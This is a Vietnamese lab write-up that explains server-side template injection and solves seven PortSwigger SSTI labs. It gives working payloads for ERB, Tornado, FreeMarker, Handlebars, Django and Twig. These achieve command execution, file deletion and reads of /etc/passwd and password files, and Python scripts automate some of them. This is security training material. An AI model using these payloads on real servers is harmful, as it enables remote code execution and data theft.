# Server-side template injection (SSTI)

## Khái niệm & Tác hại & Khai thác & Phòng tránh

- **Khái niệm**
  - Theo thời gian và nhu cầu, các dữ liệu hiển thị trên trang web không ngừng thay đổi. Ba yếu tố cơ bản nhất tạo nên một trang web là HTML, CSS, Javascript. Để thêm, sửa, xóa chức năng, dữ liệu, thay đổi bố cục giao diện dẫn đến lập trình viên cần chỉnh sửa toàn bộ source code - tiêu tốn tài nguyên, thời gian. Bởi vậy kỹ thuật template ra đời. Cách thức hoạt động cơ bản của ngôn ngữ template bao gồm back-end rendering và front-end rendering:
    - Render trên back-end bao gồm việc dịch các ngôn ngữ template theo một tiêu chuẩn và chuyển chúng thành HTML, JavaScript hoặc CSS, từ đó trả về cho phía front-end.
    - Sau đó, quá trình front-end rendering tiếp nhận, thực thi và gửi toàn bộ mã nguồn trên đến client, cho phép client tạo ra giao diện người dùng.
  - Template engines (công cụ giúp chúng ta tách mã HTML thành các phần nhỏ hơn mà chúng ta có thể sử dụng lại trên nhiều tập tin HTML) được sử dụng rộng rãi bởi các ứng dụng web nhằm trình bày dữ liệu thông qua các trang web và emails. Việc nhúng các đầu vào từ phía người dùng theo cách không an toàn vào trong templates dẫn đến Server-Side Template Injection - một lỗ hổng nghiêm trọng thường xuyên dễ dàng bị nhầm lẫn với Cross-Site Scripting (XSS), hoặc hoàn toàn bị ngó lơ.
  - ![image](https://hackmd.io/_uploads/HyxM09M9p.png)
  - Một template engine sẽ nhận nhiệm vụ nhận thông tin đầu vào là dữ liệu đầu vào và khung mẫu giao diện, rồi sử dụng cú pháp (template syntax) để render thành một file HTML để trả về người dùng. Từ đó SSTI phát sinh.
  - Không giống như XSS, Template Injection có thể được sử dụng để tấn công trực tiếp vào bên trong máy chủ web và thường bao gồm Remote Code Execution (RCE) - thực thi mã từ xa, biến mọi ứng dụng dễ bị tấn công thành các điểm then chốt tiềm năng
  - Server-side template injection xảy ra khi những nội dung được nhập vào từ phía người dùng được nhúng không an toàn vào template ở phía máy chủ, cho phép người sử dụng có thể inject template trực tiếp. Bằng cách sử dụng các template độc hại , kẻ tấn công có thể thực thi mã tùy ý và kiểm soát hoàn toàn web server. Mức độ nghiêm trọng của vấn đề này khác nhau tùy thuộc vào loại template engines được sử dụng. Các template engine có thể nằm trong phạm vi từ dễ dàng đến gần như không thể khai thác.
  - Lỗ hổng SSTI (Server Side Template Injection) là lỗ hổng bảo mật xảy ra khi ta có thể lợi dụng cú pháp của một template để thực thi những câu lệnh độc hại ở phía server

| Đặc điểm       | XSS (Cross-Site Scripting)                                                                                                                  | SSTI (Server-Side Template Injection)                                                                                                                                     |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Vị trí xử lý   | Xảy ra khi dữ liệu người dùng không được đánh giá đúng và được thực thi ngay trên trình duyệt (client side).                                | Xảy ra khi dữ liệu người dùng không được xử lý đúng trên máy chủ (server side), đặc biệt trong các hệ thống sử dụng template engine.                                      |
| Cách thực hiện | Kẻ tấn công chèn mã JavaScript hoặc HTML độc hại vào dữ liệu mà trình duyệt sau đó hiểu là phần của trang web chính.                        | Kẻ tấn công chèn mã template độc hại (thường là mã của template engine như Twig, Mustache) vào dữ liệu người dùng mà máy chủ sau đó hiểu là một phần của mẫu được render. |
| Ảnh hưởng      | Có thể dẫn đến việc thực hiện các hành động độc hại như đánh cắp cookie, thông tin đăng nhập, hoặc thậm chí kiểm soát tài khoản người dùng. | Có thể dẫn đến việc thực hiện các hành động không mong muốn, thậm chí kiểm soát máy chủ.                                                                                  |

- Ta hãy xét đến ví dụ sau: Một trang web cần gửi hàng loạt lời chào, và sử dụng Twig template để thuận tiện cho việc thay đổi tên khách hàng. Trong trường hợp sử dụng template tĩnh, tức là chỉ cung cấp các placeholder để engine lấy rồi xử lý và render ra web như dưới đây, Twig template sẽ hốt cái dữ liệu đẩy vào cái placeholder {first_name} để tạo ra nội dung chào hỏi người dùng theo kiểu:

```php
$output = $twig->render("Dear {first_name},",array("first_name" => $user.first_name));
```

Khi đó SSTI sẽ không có cửa nào vì thông tin đưa vào {first_name} chỉ là dữ liệu đơn thuần
Nhưng nếu với template này, ta cho kết hợp trực tiếp dữ liệu của người dùng nhập vào trước khi xuất ra web page thì mọi chuyện sẽ hoàn toàn khác:

```php
$output = $twig->render("Dear " . $_GET['name']);
```

- Lúc này, một phần của template không còn tĩnh nữa mà nó sẽ phụ thuộc vào tham số $\_GET[‘name’]
- Vì vậy, nếu có một user nào truyền vào một thứ độc hại vào trong tham số này, server sẽ dính lỗi SSTI

- **Tác hại**

  - Với lỗ hổng SSTI, attacker có thể thi triển RCE (Thực thi code từ xa) rồi chiếm trọn quyền điều khiển server và mở rộng sang các đối tượng khác trong hệ thống
  - Kể cả khi không thể RCE một cách triệt để, attacker cũng có thể vẫn có thể dùng SSTI để đọc những thông tin nhạy cảm của server, hoặc là lấy làm bàn đạp cho các cuộc tấn công khác như XSS, CSRF,…

- **Khai thác**

  - Nhìn chung, một cuộc tấn công SSTI sẽ gồm 3 bước: Phát hiện, Nhận diện và Khai thác
  - ![image](https://hackmd.io/_uploads/rk-b1sf9p.png)

- **Detect (Phát hiện):**

1. Plaintext context - Ở bước này , ta sẽ thử nghiệm (fuzzing) ban đầu bằng các ký tự đặc biệt thường được dùng trong template expression như là `${{<%[%'”}}%\`
   Ta sẽ thử nghiệm chúng với một số toán tử như:

```php
{{7*7}}
${7*7}
<%=7*7%>
${{7*7}}
#{7*7}
*{7*7}
```

```
freemarker=Hello ${username}
Hello newuser
```

```
freemarker=Hello ${7*7}
Hello 49
```

2. Code context - Với ngữ cảnh này, dữ liệu tôi đưa vào sẽ được đẩy vào trong template expression. Ví dụ như tình huống có một variable (biến số) mà tôi có thể kiểm soát (greeting trong trường hợp bên dưới) được đặt vào bên trong của một parameter như sau:
   `greeting = getQueryParameter('greeting')`
   Và URL tương ứng theo kiểu:
   `http://vulnerable-website.com/?greeting=data.username`
   Thì kết quả xuất ra sẽ có dạng “Hello {username}“.
   thử nghiệm SSTI theo kiểu sử dụng templating syntax phổ biến là “}}” để đút một HTML tùy ý vào sau đấy.
   `http://vulnerable-website.com/?greeting=data.username}}<tag>`
   Nếu output cho thấy kết quả có kèm theo cái HTML tôi đưa vào bên dưới thì tôi có thể chiến tiếp với SSTI.
   `Hello {username}<tag>`

- **Identify (Nhận dạng):**

  - Sau khi biết được trang web có dính lỗ hổng SSTI, ta sẽ bắt đầu nhận dạng template mà trang web sử dụng theo biểu đồ sau:
  - ![image](https://hackmd.io/_uploads/ryNtJjz5T.png)

- **Exploit (Khai thác):**
  - Explore, tìm hiểu về các đối tượng liên quan và môi trường tấn công, đồng thời thử Bruteforce các tên biến. Các object do nhà phát triển cung cấp có khả năng chứa các thông tin nhạy cảm(có thể sử dụng wordlist từ SecLists và Burp Intruder)

Front-end:

```htmlmixed
<html>
    <head>
        <title>{{title}}</title>
    </head>
    <body>
        <form method="{{method}}" action="{{action}}">
            <input type="text" name="user" value="{{username}}">
            <input type="password" name="pass" value="">
            <button type="submit">submit</button>
        </form>
        <p>Used {{mikrotime(true) - time}}</p>
    </body>
</html>
```

back-end:

```php
$template Engine=new TempLate Engine()；
$template=$template Engine-load File('login.tpl')；
$template->assign('title'， 'login')；
$template->assign('method'， 'post')；
$template->assign('action'， 'login.php')；
$template->assign('username'， get Username From Cookie() )；
$template->assign('time'， microtime(true) )；
$template->show()；
```

### Phòng tránh

- Để ngăn chặn SSTI, lập trình viên nên thực hiện render template trước, sau đó mới thay thế giá trị các tham số vào output.

## 1. Lab: Basic server-side template injection

link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

### Đề bài

![image](https://hackmd.io/_uploads/BydIDS75a.png)

### Phân tích

- Theo thông tin thì bài lab này chứa lỗi SSTI. Để solve được bài lab thì mình phải xóa file morale.txt từ thu mục home của Carlos.
- Mình chọn mục sản phẩm đầu tiên thì thấy có lệnh GET của message và chuyển hướng với nội dung là Unfortunately this product is out of stock. Và nội dung đó cũng được in ra bên ngoài màn hình.

![image](https://hackmd.io/_uploads/rylNZUXq6.png)

![image](https://hackmd.io/_uploads/Bkc8bIm9T.png)

message trả về có ở parameter trên URL -> Có thể dính XSS hoặc SSTI. Nhưng khi test XSS thì không thành công vì đã bị encode.

![image](https://hackmd.io/_uploads/HyuIMI7qp.png)

- mình thay đổi tham số parameter thì nội dung cũng thay đổi và hiện ra tương ứng vậy là chúng ta điều này có nghĩa là mình có thể điều chỉnh biến message này tùy theo ý của mình để server có thể hiện ra dòng chữ tương ứng

- ERB(Embedded Ruby) là một dạng template thường được dùng để nhúng Ruby vào một tài liệu HTML, và sử dụng các tag để phân biệt cách sử dụng nó truyền vào.
  - **<%= EXPRESSION %>** dùng để truyền vào giá trị của một phép diễn tả
  - **<% CODE %>** dùng để thực thi code, không truyền vào được giá trị.

### Khai thác

mình dùng payloadsallthething để test

![image](https://hackmd.io/_uploads/HJ1N4LQcp.png)

- mình thử truyền vào payload là <%= 7 \* 7 %>, vì với tag expression này trang nếu trang web này trả về kết quả của phép tính trên nghĩa là trang web này chứa lỗ hổng SSTI:

![image](https://hackmd.io/_uploads/HJZFE8Xqp.png)

mình dùng `ls` để liệt kê các file, thư mục và thấy file `morale.txt` cần xóa

![image](https://hackmd.io/_uploads/BJoh4IX96.png)

sau đó mình xóa file này

![image](https://hackmd.io/_uploads/S1aNr8mq6.png)

mình cũng đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
from urllib.parse import quote

url = 'https://0ad20051037dfa0f80142b7e001f00d5.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/?message=<%+system("rm+morale.txt")%>',
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/r1ptBUm5T.png)

### SSTImap

```bash!
./sstimap.py -u "https://0ad4005304ceda14802f049000f30094.web-security-academy.net/?message=*"
```

![image](https://hackmd.io/_uploads/BJA9pBe00.png)

![image](https://hackmd.io/_uploads/BJw5fLeAA.png)

## 2. Lab: Basic server-side template injection (code context)

link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

### Đề bài

![image](https://hackmd.io/_uploads/HJRnc8Xca.png)

### Phân tích

- Bài lab này dễ bị SSTI phía server sử dụng mẫu Tornado không an toàn (Theo như bài lab bảo thế). Để giải quyết vấn đề trong phòng thí nghiệm, hãy xem lại tài liệu Tornado để khám phá cách thực thi mã tùy ý, sau đó xóa tệp Morale.txt khỏi thư mục chính của Carlos.

Mình có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener:peter.

![image](https://hackmd.io/_uploads/B1LwR8mcp.png)

- Sau khi mình đăng nhập xong thì mình thấy có 1 form xử lý tên khi hiện nên mình chọn hiện Name. Phần này sẽ hiện khi mình comment 1 bài viết nào đó.

![image](https://hackmd.io/_uploads/BkPvxvmq6.png)

mình thử payload ssti nhưng có vẻ không được gì

mình quay lại trang my-acount để ý phần name mình chọn 1 kiểu hiển thị tên rồi submit và bắt gói tin trong burp suite được

![image](https://hackmd.io/_uploads/SkjrgwX5T.png)

### Khai thác

mình thấy khi gửi nó sẽ gửi theo dạng là user.name mình nghi ngờ liệu có thể SSTI vào không, nên minhg đã thử thêm {{ 7*7 }} xem liệu nó có được không:

![image](https://hackmd.io/_uploads/rk8AWDm96.png)

hiện thông báo lỗi vì thiếu dấu ngoặc kết thúc, nên mình thêm 2 dấu ngoặc }}{{7*7}} nữa xem sao:

![image](https://hackmd.io/_uploads/HyqmzvX9a.png)

và đọc lại post thấy tên của mình đã thay đổi và thực hiện phép tính 7\*7 thành công, đây chính là chỗ khai thác SSTI

![image](https://hackmd.io/_uploads/ry34zDmcT.png)

Mình tìm hiểu trên python để xóa được file Morale.txt của Carlos thì phải thực hiện được lệnh sau:

```python
import os
os.system('rm /home/carlos/morale.txt')
```

nên mình giải quyết bài lab bằng payload sau

```
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')&csrf=IkHyVGkReP5HFnxq2UA4g8d195OGLs1O
```

![image](https://hackmd.io/_uploads/SJ474PXqT.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a4700dc049a9e6080305d15003700a4.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data_login = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter',
}

response = session.post(
    url + '/login',
    data=data_login,
    verify=False,
    allow_redirects=False,
)

response = session.get(
    url + '/post?postId=5',
    verify=False,
    allow_redirects=False,
)

# session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

data_comment = {
    'postId' : '5',
    'comment' :  '123%0D%0A',
    'csrf' : csrf,

}
response = session.post(
    url + '/post/comment',
    # cookies=cookies,
    verify=False,
    allow_redirects=False,
)

response = session.get(
    url + '/post?postId=5',
    verify=False,
    allow_redirects=False,
)

response = session.get(
    url + '/my-account?id=wiener',
    verify=False,
    allow_redirects=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf' : csrf,
    'blog-post-author-display' : "user.name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')"
}

response = requests.post(
    url + '/my-account/change-blog-post-author-display',
    # cookies=cookies,
    data= data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rkCXVD79a.png)

## 3. Lab: Server-side template injection using documentation

link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation

### Đề bài

![image](https://hackmd.io/_uploads/ByDOL5XqT.png)

### Phân tích

- Lab này cũng bị dính lỗ hổng SSTI, để solve được lab mình cần phát hiện ra template engine và thực thi code để xóa file morale.txt từ thư mục home của Carlos
- mình có tài khoản riêng của mình là content-manager:C0nt3ntM4n4g3r
- Sau khi mình đăng nhập thì mình vào 1 bài biết và thấy được mình có thể chỉnh sửa được bài viết bằng click vào Edit template

![image](https://hackmd.io/_uploads/r1BhD5Xq6.png)

![image](https://hackmd.io/_uploads/S18kOqXqp.png)

xem các template nào có ký hiệu là ${} và thử từng cái một, với dấu hiệu đầu tiên là ${7\*7} và mình đã thành công phát hiện SSTI

![image](https://hackmd.io/_uploads/B1lDOcm96.png)

Mình thay đổi nội dung trong phần produce 1 chuỗi ngẫu nhiên thì màn hình sẽ báo lỗi và mình sẽ biết template này dùng Freemarker của Java

- freemarker là một thư viện của Java dùng để tạo ra các output là chữ như một file HTML

![image](https://hackmd.io/_uploads/HJ_mtqX5a.png)

### Khai thác

mình lên payloadallthething để tìm payload về freemarker

![image](https://hackmd.io/_uploads/SJF0t57qT.png)

và có được payload và dùng ls để liệt kê file

```java
${"freemarker.template.utility.Execute"?new()("ls")}
```

mình thấy được file morale.txt

![image](https://hackmd.io/_uploads/r1TL95XqT.png)

mình dùng payload sau để xóa nó

```java
 ${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được bài lab này

![image](https://hackmd.io/_uploads/B1racqQq6.png)

## 4. Lab: Server-side template injection in an unknown language with a documented exploit

link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

### Đề bài

![image](https://hackmd.io/_uploads/S1y0j9m56.png)

### Phân tích

- Lab trên cũng đã dính lỗ hổng SSTI, để solve lab mình cần phải tìm xem trang web sử dụng loại template rồi tìm cách thực thi code tùy ý mình, từ đó xóa file morale.txt từ thư viện home của Carlos.

- Trang web này hiện chi tiết của các sản phẩm khi ấn vào View details, tuy nhiên khi ấn vào sản phẩm đầu tiên nó đã hiện ra sản phẩm này đã hết hàng, và nó lấy dòng này từ URL nên mình đã nghĩ đến việc thực hiện SSTI thông qua url này:

![image](https://hackmd.io/_uploads/Hyz53qmqa.png)

- Fuzz message bằng `${{<%[%'"}}%\`, ta thấy server trả lỗi kèm theo tên template engine Handlebars của Nodejs → Server có thể dính SSTI.

![image](https://hackmd.io/_uploads/SkTbpqXc6.png)

- mình nhận định đây là template Handlebars, template này sẽ compile template thành các chức năng trong javascript

- Biết được nó dùng tempalte Handlebars của Nodejs, mình sẽ đi kiếm payload

![image](https://hackmd.io/_uploads/r143p5X9a.png)

### Khai thác

mình dùng payload sau encode URL và gửi và gửi gói tin

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![image](https://hackmd.io/_uploads/SyLgyiQqT.png)

mình đã viết lại mã khai thác

```python=
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a87001504abadb78000763700eb003a.web-security-academy.net'

session = requests.Session()

payload = """{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}"""

payload = quote(payload)

response = session.get(
    url + '/?message=' + payload,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/B1J5xsXq6.png)

## 5. Lab: Server-side template injection with information disclosure via user-supplied objects

link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects

### Đề bài

![image](https://hackmd.io/_uploads/S1OxZjQ9T.png)

### Phân tích

- Lab này dính lỗ hổng SSTI vì sử dụng cách truyền đối tượng vào một template không an toàn, ta có thể khai thác lỗ hổng này thể thu thập được những thông tin nhạy cảm của trang web. Để solve lab thì ta cần nộp secret key của framwork
- Ta được cấp tài khoản của bản thân: content-`manager:C0nt3ntM4n4g3r`

![image](https://hackmd.io/_uploads/Syr6Zo7qp.png)

- thử SSTI vào phần sửa template để xem template đang được sử dụng là gì, thì khi sử dụng payload {{7*7}} thì trang web đã xảy ra lỗi:
- thống báo cho chúng ta thấy template này là django của python.

### Khai thác

![image](https://hackmd.io/_uploads/B1JZ4j7ca.png)

- để lấy secret key mình thử dùng payload {{ messages.storages.0.signer.key }}
  nhưng không trả về cái gì

sau 1 hổi tìm kiếm mình tìm được payload ở trang web https://gitbook.seguranca-informatica.pt/fuzzing-and-web/server-side-template-injection-ssti

![image](https://hackmd.io/_uploads/H1TONj7qa.png)

mình được chuỗi secret key là ==qti4dget1k6tge95d8rxyez0dyhujtv6== và sau đó đi submit chuỗi này

![image](https://hackmd.io/_uploads/BkwbBs79a.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/r1GDSjQ96.png)

## 6. Lab: Server-side template injection in a sandboxed environment

link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment

### Đề bài

![image](https://hackmd.io/_uploads/BkaoroQca.png)

### Phân tích

- Lab này sử dụng template Freemarker, nó bị dính lỗ hổng SSTI vì cách xử lý sandbox thiếu an toàn, để solve được lab, mình cần phải đọc file my_password.txt từ thư viện home của Carlos và nộp nó
- mình được cấp tài khoản là: content-manager:C0nt3ntM4n4g3r

![image](https://hackmd.io/_uploads/rk8Evsmca.png)

mình dùng templat như bài trước nhưng không được

### Khai thác

Tất cả đều không được vì dòng freemarker.template.utility.Execute đã bị chặn, nên mình cần tìm một payload khác, và mình đã chọn payload này:

![image](https://hackmd.io/_uploads/rJwaPim9T.png)

và mình dùng payload này và gửi gói tin

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

![image](https://hackmd.io/_uploads/Sku3OoQ9p.png)

mình dùng tool kt.gy để chuyển về dạng text ASCII và được ==ubxccfiposiwtrt4dt1k==

![image](https://hackmd.io/_uploads/B1ImYjmqa.png)

mình submit và đã giải quyết được lab này

![image](https://hackmd.io/_uploads/rku8Yim5p.png)

## 7. Lab: Server-side template injection with a custom exploit

link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit

### Đề bài

![image](https://hackmd.io/_uploads/HJS-RsX5a.png)

### Phân tích

- Sau khi đăng nhập, ứng dụng chứa 2 chức năng cho phép user thay đổi cách hiển thị tên trong các post và upload avatar.

![image](https://hackmd.io/_uploads/B1VdAo796.png)

Tương tự bài lab 2, chức năng thay đổi cách hiển thị tên trong các post bị dính SSTI. Fuzz với payload `${{<%[%'"}}%\`,

![image](https://hackmd.io/_uploads/SkYy12X5a.png)

ta thấy server báo lỗi chứa template engine Twig của PHP.

![image](https://hackmd.io/_uploads/ryCbyhmcT.png)

tương tự bài trước mình gửi payload `}}{{7*7}}` chèn thêm vào name

![image](https://hackmd.io/_uploads/BkUYk2796.png)

và kết quả tên bình luận của mình thực hiện phép toán 7\*7 và bị dính lỗi SSTI

![image](https://hackmd.io/_uploads/H1Qq13m9p.png)

- Mặt khác, ở chức năng upload avatar, khi upload sai file yêu cầu, một error được trả về từ User class tại /home/carlos/User.php. Và server sẽ gọi User->setAvatar('/tmp/filename', 'MIME_TYPE') để set avatar cho user.

![image](https://hackmd.io/_uploads/BkMnl3X5a.png)

- Ta sẽ tận dụng lỗi SSTI ở trên để gọi hàm user.setAvatar() với file bất kì rồi xem avatar để lấy được nội dung file đó. Thử payload sau để set avatar là nội dung file `/etc/passwd`.

`blog-post-author-display=user.setAvatar('/etc/passwd')`

![image](https://hackmd.io/_uploads/ryZAZ3X9p.png)

Tuy nhiên như đã nói, ta cần thêm 1 tham số MIME_TYPE,

![image](https://hackmd.io/_uploads/B15kM2Qcp.png)

- và vì avatar yêu cầu file ảnh, nên ta truyền thêm image/jpeg.

`blog-post-author-display=user.setAvatar('/etc/passwd','image/jpeg'`

![image](https://hackmd.io/_uploads/B1ydG27qa.png)

dùng dirsearch mình thấy có thư mục `/avatar`

Truy cập xem avatar, ta thấy nội dung file `/etc/passwd` đã được trả về.

![image](https://hackmd.io/_uploads/rkYGmnQcT.png)

### Khai thác

- Sử dụng phương pháp tương tự để xem nội dung class User.

- và mỗi lần chúng ta liên kết 1 file đến avatar của chúng ta thì chúng ta cần repress lại trang vì lúc đó payload của chúng ta mới được nhận đến template engine

`blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')`

được source code class User:

```php=
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}
```

- Hàm setAvatar(filename, mimetype) sẽ tạo 1 symlink từ avatarLink đến filename. Mặt khác hàm gdprDelete() lại có chức xóa cả avatarLink và target nó đang link đến (chính là filename).
- Như vậy mính sẽ set avatar là file cần xóa `'/home/carlos/.ssh/id_rsa'`.

`blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpeg')`

![image](https://hackmd.io/_uploads/r1xBjCXq6.png)

![image](https://hackmd.io/_uploads/HkHC6R7qp.png)

Gọi user.gdprDelete() để xóa.

`blog-post-author-display=user.gdprDelete()`

![image](https://hackmd.io/_uploads/BkvsjCQ9T.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được bài lab này

![image](https://hackmd.io/_uploads/HJI_y145T.png)

## Chú thích

### **class**

- Trong Python, **class** là một thuộc tính đặc biệt của một đối tượng. Khi được gọi trên một đối tượng, nó trả về một tham chiếu đến lớp của đối tượng đó. Điều này có thể hữu ích khi bạn muốn biết lớp mà một đối tượng thuộc về.

Ví dụ, nếu bạn có một đối tượng obj, bạn có thể truy cập lớp của nó bằng cách sử dụng obj.**class**. Điều này cho phép bạn truy cập các phương thức và thuộc tính của lớp mà obj thuộc về.

VD:

```python!
class MyClass:
    def __init__(self, x):
        self.x = x

obj = MyClass(5)
print(obj.__class__)  # In ra: <class '__main__.MyClass'>
```

- Trong trường hợp này, obj.**class** trả về lớp MyClass.
- Trong tình huống ứng dụng không chứa cơ chế filter, chúng ta luôn có thể truy cập các đối tượng `'', (), []`. Kết hợp với `__class__`, chẳng hạn với payload `''.__class__`

![image](https://hackmd.io/_uploads/rJmyDaqna.png)

### **bases**

- cho phép truy cập tới lớp cha của đối tượng hiện tại. Ví dụ:

VD:

````python!
class Animal:
    def __init__(self, name):
        self.name = ```name

class Dog(Animal):
    def __init__(self, name, breed):
        super().__init__(name)
        self.breed = breed

dog = Dog("Buddy", "Golden Retriever")
print(dog.__class__.__bases__)  # Output: (<class '__main__.Animal'>,)
````

- Chúng ta cần truy cập đến lớp Object trong ứng dụng - là lớp cha của các lớp str, tuple, list. Chẳng hạn với payload `().__class__.__bases__`

### **mro**

- Trong Python, **mro** là một thuộc tính đặc biệt của một lớp (class). **mro** là viết tắt của "Method Resolution Order" (Thứ tự giải quyết phương thức). Nó là một tuple chứa thứ tự mà Python sẽ tìm kiếm các phương thức khi gọi chúng trên một đối tượng của lớp đó.

- Khi bạn gọi một phương thức trên một đối tượng của một lớp, Python sẽ tìm kiếm phương thức đó trong lớp của đối tượng đó, sau đó trong các lớp kế thừa của lớp đó theo thứ tự được xác định bởi **mro**.

VD:

```python!
class A:
    def method(self):
        print("Method from class A")

class B(A):
    def method(self):
        print("Method from class B")

class C(A):
    def method(self):
        print("Method from class C")

class D(B, C):
    pass

obj = D()
obj.method()
print(D.__mro__)
```

kết quả

```python!
Method from class B
(<class '__main__.D'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.A'>, <class 'object'>)
```

Trong ví dụ này, D kế thừa từ B và C. Khi gọi phương thức method() trên một đối tượng của D, Python tìm kiếm phương thức đầu tiên trong lớp D, sau đó trong B, sau đó trong C, và cuối cùng là trong A, và nếu không tìm thấy thì sẽ tìm trong lớp object (lớp cơ sở của tất cả các lớp trong Python). Điều này phản ánh trong giá trị của D.**mro**.

### **subclasses**

- Trong Python, **subclasses** là một phương thức đặc biệt của lớp (class). Khi được gọi trên một lớp, phương thức này trả về một danh sách các lớp con trực tiếp của lớp đó.

VD:

```python!
class Parent:
    pass

class Child1(Parent):
    pass

class Child2(Parent):
    pass

class Grandchild(Child1):
    pass

print(Parent.__subclasses__())  # In ra: [<class '__main__.Child1'>, <class '__main__.Child2'>]
print(Child1.__subclasses__())  # In ra: [<class '__main__.Grandchild'>]
print(Child2.__subclasses__())  # In ra: []
```

- Trong ví dụ này, Parent có hai lớp con trực tiếp là Child1 và Child2. Child1 có một lớp con trực tiếp là Grandchild, trong khi Child2 không có lớp con nào.

- Lưu ý rằng **subclasses** chỉ trả về các lớp con trực tiếp, không phải tất cả các lớp con trong toàn bộ hệ thống lớp.

### **init**

- là phương thức khởi tạo lớp
- Chúng ta thường sử dụng `__init__` làm cơ sở gọi `__globals__`.
- `__globals__` trả về tất cả module, phương thức, biến có thể sử dụng

## Tham khảo

- https://www.paloaltonetworks.com/blog/prisma-cloud/template-injection-vulnerabilities/
- `https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection?source=post_page-----c6e9fbb20743--------------------------------`
- https://viblo.asia/p/server-side-template-injection-vulnerabilities-ssti-cac-lo-hong-ssti-phan-3-Ny0VGjAYLPA

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
